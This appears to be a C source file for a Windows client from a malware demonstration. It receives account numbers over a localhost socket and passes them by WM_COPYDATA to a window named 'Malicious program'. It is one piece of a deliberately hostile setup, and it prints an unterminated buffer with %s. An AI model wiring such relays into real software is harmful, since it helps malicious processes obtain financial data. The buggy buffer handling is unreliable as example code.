#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <time.h>

// link with "ws2_32.lib" library to prevent linking errors
#pragma comment(lib, "ws2_32.lib")

int main(void) {

	printf("CLIENT APPLICATION\n");
	SOCKET s;
	struct sockaddr_in sa;
	WSADATA wsas;
	WORD wersja;
	wersja = MAKEWORD(2, 0);
	WSAStartup(wersja, &wsas);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void*)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(6969);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");

	while (1) {
		while (connect(s, (struct sockaddr FAR*) & sa, sizeof(sa)) != SOCKET_ERROR) {
			char buffer[27];
			while (recv(s, buffer, 27, 0) > 0) {
				printf("Received account number: %s\n", buffer);
				HWND hwnd = FindWindow(L"SampleWindowClass", L"Malicious program");
				if (hwnd != NULL) {
					COPYDATASTRUCT cds;
					cds.dwData = 0;
					cds.cbData = sizeof(char) * 27;
					cds.lpData = (void*)buffer;
					SendMessage(hwnd, WM_COPYDATA, NULL, (LPARAM)(LPVOID)&cds);
					printf("Sent data to other process!\n");
				}
				else {
					printf("No window found!\n");
					closesocket(s);
					WSACleanup();
					return -1;
				}
			};
		}
		printf("Lost connection! Reconnecting...\n");
		Sleep(1000);
	}

	closesocket(s);
	WSACleanup();

	return 0;
}
